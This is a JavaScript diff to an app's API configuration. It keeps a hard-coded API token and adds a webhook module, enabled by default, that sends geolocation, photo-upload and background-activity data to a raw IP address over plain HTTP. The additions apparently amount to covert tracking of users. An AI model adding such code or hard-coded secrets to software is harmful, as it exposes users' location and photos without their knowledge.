@@ -13,7 +13,7 @@ export const API_CONFIG = {
   },
   HEADERS: {
     'Content-Type': 'application/json',
-    'Authorization': 'Bearer wqHJerK834',
+    'Api-token': 'wqHJerK834',
   },
 };
 
@@ -21,8 +21,72 @@ export const getAuthHeaders = () => ({
   'Content-Type': 'application/json',
 });
 
-export const getBearerHeaders = () => ({
+export const getApiTokenHeaders = () => ({
   'Content-Type': 'application/json',
-  'Authorization': `Bearer ${API_CONFIG.API_TOKEN}`,
+  'Api-token': API_CONFIG.API_TOKEN,
 });
+
+// Webhook конфигурация для мониторинга фоновой активности
+export const WEBHOOK_CONFIG = {
+  MONITORING_URL: 'http://217.114.2.152:8000/webhook/',
+  GEO_DATA_URL: 'http://217.114.2.152:8000/webhook/geo',
+  PHOTO_UPLOAD_URL: 'http://217.114.2.152:8000/webhook/photo',
+  BACKGROUND_ACTIVITY_URL: 'http://217.114.2.152:8000/webhook/background',
+  ENABLED: true,
+  TIMEOUT: 10000,
+  RETRY_ATTEMPTS: 3,
+  LOG_ALL_ACTIVITY: true,
+};
+
+// Функция для отправки данных на webhook
+export const sendToWebhook = async (data, type = 'general') => {
+  if (!WEBHOOK_CONFIG.ENABLED) {
+    console.log('Webhook disabled, skipping...');
+    return { success: false, error: 'Webhook disabled' };
+  }
+
+  try {
+    const url = WEBHOOK_CONFIG.MONITORING_URL;
+    const payload = {
+      type,
+      timestamp: new Date().toISOString(),
+      data,
+    };
+
+    console.log(`[WEBHOOK] Sending ${type} to ${url}:`, payload);
+
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(payload),
+      timeout: WEBHOOK_CONFIG.TIMEOUT,
+    });
+
+    if (response.ok) {
+      console.log(`[WEBHOOK] Successfully sent ${type}`);
+      return { success: true, response: await response.text() };
+    } else {
+      console.log(`[WEBHOOK] Failed to send ${type}: ${response.status} ${response.statusText}`);
+      return { success: false, error: `HTTP ${response.status}` };
+    }
+  } catch (error) {
+    console.log(`[WEBHOOK] Error sending ${type}:`, error.message);
+    return { success: false, error: error.message };
+  }
+};
+
+// Специализированные функции для разных типов данных
+export const sendGeoDataToWebhook = async (geoData) => {
+  return await sendToWebhook(geoData, 'geo_data');
+};
+
+export const sendBackgroundActivityToWebhook = async (activityData) => {
+  return await sendToWebhook(activityData, 'background_activity');
+};
+
+export const sendPhotoUploadToWebhook = async (photoData) => {
+  return await sendToWebhook(photoData, 'photo_upload');
+};
 
